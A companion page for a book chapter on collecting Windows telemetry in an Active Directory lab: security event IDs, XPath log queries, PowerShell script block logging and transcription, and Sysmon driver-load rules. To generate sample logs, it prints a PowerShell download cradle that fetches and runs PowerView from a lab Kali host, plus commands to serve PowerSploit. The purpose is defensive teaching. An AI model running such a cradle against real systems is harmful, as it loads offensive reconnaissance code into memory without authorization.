---
layout: default
title: Collecting Telemetry
tags: []
header_type       : "hero"
include_on_search : true
show_tags         : true
---


<div class="bs-component">
    <div class="progress">
        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 50%; background-color:#eb34e1"></div>
    </div>
</div>

## Introduction

This chapter explores the key log sources present in the Attack Range that enterprise Active Directory environments can make use of. It includes details of Windows event logs, PowerShell logs and Sysmon.


<hr>

## Chapter Content

This section provides reproductions of the key figures and code snippets seen in this chapter.


#### Windows Event Logs

Microsoft offers its own list of key event IDs to monitor. These can be seen below:

| Sourced from: <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor</a>

<details>
<summary>Key Event IDs</summary>

<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">ID</th>
      <th scope="col">Event Summary</th>
      <th scope="col">Potential application</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>4624</td>
      <td>An account was successfully logged on.</td>
      <td>Identification of anomalous account activity.
        Large-scale reconnaissance of neighboring hosts.<br/></td>
    </tr>
    <tr>
      <td>4625</td>
      <td>An account failed to log on.</td>
      <td>Identification of anomalous account activity, brute force attempts, or password spraying.<br/></td>
    </tr>
    <tr>
      <td>4728</td>
      <td>A member was added to a security-enabled global group.</td>
      <td>Privilege escalation via group membership changes. For example, additions to the Domain Admins group.<br/></td>
    </tr>
        <tr>
      <td>4732</td>
      <td>A member was added to a security-enabled local group.</td>
      <td>Privilege escalation or increased access on a specific host. For example, addition to the local Administrators group.<br/></td>
    </tr>
    <tr>
      <td>4733</td>
      <td>A member was removed from a security-enabled local group.</td>
      <td>Unauthorized changes to local privileged groups.<br/></td>
    </tr>
    <tr>
      <td>4768</td>
      <td>A Kerberos authentication ticket (TGT) was requested.</td>
      <td>Anomalous authentication attempts via Kerberos.<br/>
        Pass-the-Ticket activity.<br/></td>
    </tr>
    <tr>
      <td>4769</td>
      <td>A Kerberos service ticket was requested.</td>
      <td>Anomalous or large-scale requests for Kerberos service tickets (kerberoasting).<br/></td>
    </tr>
    <tr>
      <td>4741</td>
      <td>A computer account was created.</td>
      <td>Precursor to Kerberos attacks such as Resource-based Constrained Delegation (RBCD).<br/></td>
    </tr>
    <tr>
      <td>4688</td>
      <td>A new process has been created.</td>
      <td>Execution of suspicious commands.<br/> 
        Use of living-off-the-land binaries and scripts (LOLBAS).<br/></td>
    </tr>
    <tr>
      <td>4698</td>
      <td>A scheduled task was created.</td>
      <td>Installation of persistence.<br/></td>
    </tr>
    <tr>
      <td>7045</td>
      <td>A new service was installed in the system.</td>
      <td>Persistence installation.<br/>
        Privilege escalation.<br/></td>
    </tr>
    <tr>
      <td>5145</td>
      <td>A network share object was checked to see whether client can be granted desired access.</td>
      <td>Anomalous file share access.<br/>
        File share reconnaissance.<br/></td>
    </tr>
    <tr>
      <td>4662</td>
      <td>An operation was performed on an object.</td>
      <td>DCSync attacks.<br/>
        Certificate modification (ESC4).<br/></td>
    </tr>
    <tr>
      <td>5136</td>
      <td>A directory service object was modified.</td>
      <td>User modifications for targeted kerberoasting.<br/>
        Constrained delegation.<br/></td>
    </tr>
  </tbody>
</table>

</details>

##### Viewing Logs in Event Viewer

A query to filter Windows Event Logs for login events on the `ar-win-dc` domain controller in the Attack Range environment.

```xml
<QueryList>
    <Query Id="0" Path="Security">
        <Select Path="Security">
            *[System[(Computer='ar-win-dc.attackrange.local') and (EventID=4624)]]
        </Select>
    </Query>
</QueryList>
```

Another query, similar to the above, that looks for events from the `Administrator` user with a `LogonType` of 2 (a local logon).

```xml
<QueryList>
    <Query Id="0" Path="Security">
        <Select Path="Security">
            *[System[EventID=4624] and 
            EventData[Data[@Name='TargetUserName']='Administrator'] and 
            EventData[Data[@Name='LogonType']='2']]
        </Select>
    </Query>
</QueryList>
```

An example of the XML event log data produced from the above query.

```xml
<Event xmlns="http://schemas.microsoft.com/win/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
    <EventID>4624</EventID> 
    <Level>0</Level> 
    --snip--
    <Opcode>0</Opcode> 
    <Keywords>0x8020000000000000</Keywords> 
    <EventRecordID>182608</EventRecordID> 
    <Correlation ActivityID="{28aa6104-6329-0004-4561-aa282963da01}" /> 
    <Execution ProcessID="656" ThreadID="5012" /> 
    <Channel>Security</Channel> 
    <Computer>ar-win-dc.attackrange.local</Computer> 
    <Security /> 
  </System>
  <EventData>
    <Data Name="TargetUserSid">S-1-5-21-3003545274-3581856904-3772676767-500</Data> 
    Data Name="TargetUserName">Administrator</Data>
    <Data Name="TargetDomainName">ATTACKRANGE</Data> 
    <Data Name="TargetLogonId">0x96c541</Data> 
    <Data Name="LogonType">2</Data>
    <Data Name="LogonProcessName">seclogo</Data> 
    <Data Name="AuthenticationPackageName">Negotiate</Data> 
    <Data Name="WorkstationName">AR-WIN-DC</Data> 
    <Data Name="LogonGuid">{9a9ab8a0-2038-26c7-ce46-2604db784955}</Data> 
    <Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data> 
    <Data Name="ImpersonationLevel">%%1833</Data> 
    --snip--
  </EventData>
</Event>
```

The `wevtutil` command can be used to perform queries outside of Event Viewer.

```powershell
wevtutil qe Security "/q:*[System[EventID=4624] and EventData[Data[@Name='TargetUserName']='Administrator'] and EventData[Data[@Name='LogonType']='2']]"
```


#### PowerShell Logging

##### Script Blocks

Commands to install PowerSploit and host it on the Kali host in the Attack Range environment.

```sh
sudo apt update
sudo apt install powersploit
cd /usr/share/windows-resources/powersploit
python3 -m http.server 1337
```

A PowerShell download cradle that can fetch and load the PowerView script into memory on a Windows host.

```powershell
Invoke-Expression (New-Object Net.Webclient).DownloadString("http://10.0.1.30:1337/Recon/PowerView.ps1")
```

The first of many associated PowerShell Script Block log entries (event ID 4104) for the above download cradle:

```xml
<Event xmlns="http://schemas.microsoft.com/win/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
    <EventID>4104</EventID> 
    <Level>5</Level> 
    --snip--
    <Execution ProcessID="5192" ThreadID="5164" /> 
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
    <Computer>ar-win-2.attackrange.local</Computer> 
    <Security UserID="S-1-5-21-1234998748-2444849041-1163457548-500" /> 
  </System>
  <EventData>
    <Data Name="MessageNumber">1</Data> 
    <Data Name="MessageTotal">1</Data> 
    <Data Name="ScriptBlockText">Invoke-Expression (New-Object Net.Webclient).DownloadString("http://10.0.1.30:1337/Recon/PowerView.ps1")</Data> 
    <Data Name="ScriptBlockId">3d296d00-b3bf-426c-9f87-9215896c146e</Data> 
    <Data Name="Path" /> 
  </EventData>
</Event>
```


##### Transcription

The `reg` command to enable PowerShell transcription.

```sh
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 1 /f
```

An example of PowerShell transcription log that shows a user fetching the current process ID.

```
**********************
Windows PowerShell transcript start
--snip--
Username: AR-WIN-2\Administrator
RunAs User: AR-WIN-2\Administrator
Configuration Name: 
Machine: AR-WIN-2 (Microsoft Windows NT 10.0.17763.0)
Host Application: powershell
Process ID: 648
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.17763.5202
**********************
**********************
**********************
PS C:\Users\Administrator>[System.Diagnostics.Process]::GetCurrentProcess().Id 
648
```


#### Sysmon

The list of events produced from Sysmon at the time of writing can be seen below.

| Sourced from: <a target="_blank" href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events">https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#events</a>

<details>
<summary>Sysmon Event IDs</summary>
<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">ID</th>
      <th scope="col">Event Name</th>
      <th scope="col">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td>Process creation</td>
      <td>Records the creation of a new process, capturing details like the process ID, executable, and command line arguments. Also includes a process GUID that’s unique across a domain, aiding log correlation.</td>
    </tr>
    <tr>
      <td>2</td>
      <td>A process changed a file creation time</td>
      <td>Captures changes to the creation timestamp of a file. Commonly performed by attackers to \textit{timestomp} a new malicious file so it blends in with existing files.</td>
    </tr>
    <tr>
      <td>3</td>
      <td>Network connection</td>
      <td>Logs details of TCP and UDP network connections, including source and destination IP addresses and ports, as well as the originating process ID and GUID.</td>
    </tr>
    <tr>
      <td>4</td>
      <td>Sysmon service state changed</td>
      <td>Logs changes in the state of the Sysmon service, such as when it is started or stopped.</td>
    </tr>
    <tr>
      <td>5</td>
      <td>Process terminated</td>
      <td>Records the termination of a process, providing information including its ID and GUID.</td>
    </tr>
    <tr>
      <td>6</td>
      <td>Driver loaded</td>
      <td>Captures information about loaded kernel drivers, including hashes and signature information.</td>
    </tr>
    <tr>
      <td>7</td>
      <td>Image loaded</td>
      <td>Logs when a module or image is loaded into a process. This includes where the image was loaded from, into which process, and details of hashes and signature information.</td>
    </tr>
    <tr>
      <td>8</td>
      <td>CreateRemoteThread</td>
      <td>Monitors a process’s creation of remote threads in other processes. This includes details of the source and destination processes, as well as information on the memory address, module and function being run.</td>
    </tr>
    <tr>
      <td>9</td>
      <td>RawAccessRead</td>
      <td>Captures attempts to directly read disk sectors through \verb|</td>
    </tr>
    <tr>
      <td>10</td>
      <td>ProcessAccess</td>
      <td>Logs when a process attempts to access another process via the opening of a handle. This includes details of the source and destination processes.</td>
    </tr>
    <tr>
      <td>11</td>
      <td>FileCreate</td>
      <td>Records the creation and overwriting of files, including details like file name, size, and creation timestamp.</td>
    </tr>
    <tr>
      <td>12</td>
      <td>RegistryEvent (Object create and delete)</td>
      <td>Captures the creation and deletion of registry keys and values.</td>
    </tr>
    <tr>
      <td>13</td>
      <td>RegistryEvent (Value Set)</td>
      <td>Captures when Registry values are modified, including the value that was set when of types DWORD or QWORD.</td>
    </tr>
    <tr>
      <td>14</td>
      <td>RegistryEvent (Key and Value Rename)</td>
      <td>Captures when an existing Registry key and value are renamed.</td>
    </tr>
    <tr>
      <td>15</td>
      <td>FileCreateStreamHash</td>
      <td>Monitors the creation of file streams and calculates their hash values.</td>
    </tr>
    <tr>
      <td>16</td>
      <td>ServiceConfigurationChange</td>
      <td>Logs changes to Sysmon configuration, such as rule additions or modifications.</td>
    </tr>
    <tr>
      <td>17</td>
      <td>PipeEvent (Pipe Created)</td>
      <td>Captures the creation of named pipes, including details like the pipe name and process information.</td>
    </tr>
    <tr>
      <td>18</td>
      <td>PipeEvent (Pipe Connected)</td>
      <td>Captures when a named pipe connection occurs, providing details about the connecting process.</td>
    </tr>
    <tr>
      <td>19</td>
      <td>WmiEvent (WmiEventFilter activity detected)</td>
      <td>Logs events related to Windows Management Instrumentation (WMI) event filter registration, including the namespace, filter name and expression.</td>
    </tr>
    <tr>
      <td>20</td>
      <td>WmiEvent (WmiEventConsumer activity detected)</td>
      <td>Captures the registration of WMI consumers.</td>
    </tr>
    <tr>
      <td>21</td>
      <td>WmiEvent (WmiEventConsumerToFilter activity detected)</td>
      <td>Logs when a consumer binds to a filter, including details of consumer name and filter path.</td>
    </tr>
    <tr>
      <td>22</td>
      <td>DNSEvent (DNS Query)</td>
      <td>Captures when a process makes a DNS query, including the originating process and the hostname to be resolved.</td>
    </tr>
    <tr>
      <td>23</td>
      <td>FileDelete (File Delete archived)</td>
      <td>Captures the deletion of a file, and also saves the original file to the configured archive directory.</td>
    </tr>
    <tr>
      <td>24</td>
      <td>ClipboardChange (New content in the clipboard)</td>
      <td>Logs changes to the clipboard contents.</td>
    </tr>
    <tr>
      <td>25</td>
      <td>ProcessTampering (Process image change)</td>
      <td>Logs activity relating to evasion techniques such as \textit{process hollowing} and \textit{herpaderping.}</td>
    </tr>
    <tr>
      <td>26</td>
      <td>FileDeleteDetected (File Delete logged)</td>
      <td>Logs the deletion of a file, without the archiving functionality detailed in Event ID 23.</td>
    </tr>
    <tr>
      <td>27</td>
      <td>FileBlockExecutable</td>
      <td>Captures when Sysmon blocks the writing of an executable based on the conditions detailed in its configuration.</td>
    </tr>
    <tr>
      <td>28</td>
      <td>FileBlockShredding</td>
      <td>Generates events when Sysmon blocks file shredding.</td>
    </tr>
    <tr>
      <td>29</td>
      <td>FileExecutableDetected</td>
      <td>Logs the creation of a new executable file.</td>
    </tr>
    <tr>
      <td>255</td>
      <td>Error</td>
      <td>Logs when Sysmon encounters an error, potentially due to heavy load, failure to complete tasks, or encountering a bug.</td>
    </tr>
  </tbody>
</table>


</details>

##### Windows

A snippet of the Sysmon schema that can be output with the `-s` flag.

```xml
<manifest schemaversion="x.xx" binaryversion="xx">
  <configuration> 
    --snip--
    <filters default="is">is,is not,contains,contains any,is any,contains all,excludes,excludes any,excludes all,begin with,not begin with,end with,not end with,less than,more than,image</filters>
  </configuration>
  <events>
    <event name="SYSMONEVENT_DRIVER_LOAD" value="6" level="Informational" template="Driver loaded" rulename="DriverLoad" version="4">
      <data name="RuleName" inType="win:UnicodeString" outType="xs:string" />
      <data name="UtcTime" inType="win:UnicodeString" outType="xs:string" />
      <data name="ImageLoaded" inType="win:UnicodeString" outType="xs:string" />
      <data name="Hashes" inType="win:UnicodeString" outType="xs:string" />
      <data name="Signed" inType="win:UnicodeString" outType="xs:string" />
      <data name="Signature" inType="win:UnicodeString" outType="xs:string" />
      <data name="SignatureStatus" inType="win:UnicodeString" outType="xs:string" />
    </event>
    --snip--
  </events>
</manifest>
```

A Sysmon configuration that monitors for driver load events where the hash matches an entry from LOLDrivers or is a tool of interest, while excluding Intel-signed drivers.

```xml
<Sysmon schemaversion="x.xx">
  <HashAlgorithms>*</HashAlgorithms>
  <EventFiltering>
    <RuleGroup name="Vulnerable or Malicious Driver Load" groupRelation="or"> 
      <DriverLoad onmatch="include">
        <Hashes name="LOLDriver Match" condition="contains">SHA256=56066ed07bad3b5c1474e8fae5ee2543d17d7977369b34450bd0775517e3b25c</Hashes>
        <Hashes name="LOLDriver Match" condition="contains">SHA256=06a0ec9a316eb89cb041b1907918e3ad3b03842ec65f004f6fa74d57955573a4</Hashes>
      </DriverLoad>         
    </RuleGroup>
    <RuleGroup name="Exclude Intel Drivers" groupRelation="or">
      <DriverLoad onmatch="exclude">
        <Signature condition="begin with">Intel </Signature>
      </DriverLoad>
    </RuleGroup>
    <RuleGroup name="Tools of interest" groupRelation="or"> 
      <DriverLoad onmatch="include">
        <ImageLoaded name="Suspicious Tool Driver Load: System Informer" condition="contains">systeminformer.sys</ImageLoaded>
      </DriverLoad>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

The command to load a Sysmon config using the Sysmon binary.

```sh
Sysmon.exe -c "C:\Program Files\ansible\drivers-sysmon.xml"

Loading configuration file with schema version x.xx
Configuration file validated.
Configuration updated.
```

An example of the kernel driver load event produced with the above Sysmon configuration.

```xml
<Event xmlns="http://schemas.microsoft.com/win/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
    <EventID>6</EventID> 
    <Level>4</Level> 
    --snip--
    <EventRecordID>3673</EventRecordID> 
    <Execution ProcessID="2792" ThreadID="3420" /> 
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
    <Computer>ar-win-dc</Computer> 
    <Security UserID="S-1-5-18" /> 
  </System>
  <EventData>
    <Data Name="RuleName">Suspicious Tool Driver Load: System Informer***</Data>
    <Data Name="ImageLoaded">C:\Program Files\SystemInformer\SystemInformer.sys***</Data>
    --snip--
    <Data Name="Hashes">SHA1=DB08DBE68A6C9BB29550E33CE95CE54CAF83E925,MD5=10BFCFC0215DAE77FB84BE8B2E63110E,SHA256=96A37B18EDE4B5BC616822C023B1B8CD85B3A76B205229701E21D75EA101B57C,IMPHASH=D6A8D3591C46C44511F288817529A6B4</Data> 
    <Data Name="Signed">true</Data> 
    <Data Name="Signature">Microsoft Windows Hardware Compatibility Publisher</Data> 
    <Data Name="SignatureStatus">Valid</Data> 
  </EventData>
</Event>
```



<hr>

## Resources

The following resources expand on topics covered in this chapter.
<br/>
<br/>

#### Windows Event Logs

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Details from Microsoft on the standard event logs available and how they're configured in the Windows Registry</h6>
                <p><i>"Eventlog Key," Microsoft, accessed April 28, 2024</i></p>
                <a target="_blank" href="https://learn.microsoft.com/en-us/windows/win32/eventlog/eventlog-key" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>An invaluable reference for Windows event log and Sysmon event data</h6>
                <p><i>"Windows Security Log Encyclopedia," Ultimate Windows Security, accessed March 30, 2024</i></p>
                <a target="_blank" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A guide to Windows event log forwarding (WEF)</h6>
                <p><i>"The Windows Event Forwarding Survival Guide," Chris Long, July 24, 2017</i></p>
                <a target="_blank" href="https://medium.com/hackernoon/the-windows-event-forwarding-survival-guide-2010db7a68c4" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Utilizing native logging provided by audit policy and System Access Control Lists (SACLs) to detect various post-exploitation behaviours</h6>
                <p><i>"Detecting Windows Endpoint Compromise with SACLs," Dane Stuckey, July 16, 2018</i></p>
                <a target="_blank" href="https://medium.com/@cryps1s/detecting-windows-endpoint-compromise-with-sacls-cd748e10950" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>More details on using XPath queries to filter and query Windows event log</h6>
                <p><i>"Event Queries and Event XML," Microsoft, July 28, 2009</i></p>
                <a target="_blank" href="https://learn.microsoft.com/en-us/previous-versions/bb399427(v=vs.90)" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Guidance from Microsoft on default event log audit policy configuration, as well as recommended and elevated logging policy configurations</h6>
                <p><i>"Audit Policy Recommendations," Microsoft, August 3, 2023</i></p>
                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Microsoft's guidance on effective Windows event logging for defending Active Directory deployments</h6>
                <p><i>"Monitoring Active Directory for Signs of Compromise," Microsoft, February 15, 2023</i></p>
                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/monitoring-active-directory-for-signs-of-compromise" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Microsoft's extensive list of events to monitor</h6>
                <p><i>"Appendix L: Events to Monitor," Microsoft, June 8, 2022</i></p>
                <a target="_blank" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### PowerShell Logging

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Notice of the deprecation of PowerShell version 2</h6>
                <p><i>"Windows PowerShell 2.0 Deprecation," Microsoft, August 24, 2017</i></p>
                <a target="_blank" href="https://devblogs.microsoft.com/powershell/windows-powershell-2-0-deprecation/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>An example Sigma rule for the detection of PowerShell downgrade attacks</h6>
                <p><i>"proc_creation_win_powershell_downgrade_attack.yml," Harish Segar, January 4, 2023</i></p>
                <a target="_blank" href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_downgrade_attack.yml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The suspicious cmdlets and script elements that triggers production of script block logging events</h6>
                <p><i>"CompiledScriptBlock.cs," GitHub, accessed April 28, 2024</i></p>  
                <a target="_blank" href="https://github.com/PowerShell/PowerShell/blob/a32700a1c15a227bde54a0b80fa83cbe47bd2f27/src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs#L1832-L1968" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Other examples of PowerShell download cradles from Will Schroeder</h6>
                <p><i>"DownloadCradles.ps1," Will Schroeder, accessed March 30, 2014</i></p>
                <a target="_blank" href="https://gist.github.com/HarmJ0y/bb48307ffa663256e239" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>More detail on PowerShell logging features and configuration options</h6>
                <p><i>"Greater Visibility Through PowerShell Logging," Matthew Dunwoody, February 11, 2016</i></p>
                <a target="_blank" href="https://www.mandiant.com/resources/blog/greater-visibility" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>An overview of AMSI and its architecture, as well as demonstrations of its effect on file-less malware</h6>
                <p><i>"How the Antimalware Scan Interface (AMSI) helps you defend against malware," Microsoft, August 23, 2019</i></p>
                <a target="_blank" href="https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A thoroughly detailed walkthrough of AMSI and the telemetry it can produce</h6>
                <p><i>"Better know a data source: Antimalware Scan Interface," Jimmy Astle, Matt Graeber, July 19, 2022</i></p>
                <a target="_blank" href="https://redcanary.com/blog/amsi/" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

#### Sysmon

<div class="row row-cols-1 row-cols-md-1">
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A comparison between the telemetry and detection engineering aspects of Sysmon and the Microsoft Defender for Endpoint EDR solution</h6>
                <p><i>"Sysmon vs Microsoft Defender for Endpoint, MDE Internals 0x01," Olaf Hartong, October 15, 2021</i></p>
                <a target="_blank" href="https://medium.com/falconforce/sysmon-vs-microsoft-defender-for-endpoint-mde-internals-0x01-1e5663b10347" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>@SwiftOnSecurity’s Sysmon configuration, designed as a performant and highly-tuned option. Used in the Attack Range lab environment by default</h6>
                <p><i>"sysmon-config," @SwiftOnSecurity, accessed May 24, 2024</i></p>
                <a target="_blank" href="https://github.com/SwiftOnSecurity/sysmon-config" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Olaf Hartong’s <code>sysmon-modular</code> repository provides an organized collection of Sysmon configuration snippets organized by event type, as well as a range of generated configurations that vary in verbosity and application</h6>
                <p><i>"sysmon-modular," Olaf Hartong, accessed May 24, 2024</i></p>
                <a target="_blank" href="https://github.com/olafhartong/sysmon-modular" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>A fork of @SwiftOnSecurity’s Sysmon configuration maintained by Florian Roth, Tobias Michalski, Christian Burkard and Nasreddine Bencherchali. This configuration extends the original with additional entries for known offensive tool indicators and exploits</h6>
                <p><i>"sysmon-config," Florian Roth, Tobias Michalski, Christian Burkard and Nasreddine Bencherchali, accessed May 24, 2024</i></p>
                <a target="_blank" href="https://github.com/Neo23x0/sysmon-config" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>An offensive perspective on operating on hosts monitored with Sysmon</h6>
                <p><i>"Operating Offensively Against Sysmon," Carlos Perez, October 8, 2018</i></p>
                <a target="_blank" href="https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>Extracting Sysmon configuration from Windows Registry</h6>
                <p><i>"SysmonRuleParser.ps1," Matt Graeber, accessed March 30, 2024</i></p>
                <a target="_blank" href="https://github.com/mattifestation/PSSysmonTools/blob/master/PSSysmonTools/Code/SysmonRuleParser.ps1" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
    <div class="col mb-4">
        <div class="card">
            <div class="card-body">
                <h6>The lab environment Linux Sysmon configuration</h6>
                <p><i>"SysMonLinux-CatchAll.xml," accessed May 23, 2024</i></p>
                <a target="_blank" href="https://github.com/splunk/attack_range/blob/develop/configs/SysMonLinux-CatchAll.xml" class="btn btn-primary" style="background-color:#eb34e1">Read More</a>
            </div>
        </div>
    </div>
</div>

<div class="container">
  <div class="row">
    <div class="col" style="text-align: left">
      <a href="/part-II/environment-setup/" class="btn btn-primary"><< Chapter 5</a>
    </div>
    <div class="col" style="text-align: right">
      <a href="/part-II/network-traffic-and-event-tracing/" class="btn btn-primary">Chapter 7 >></a>
    </div>
  </div>
</div>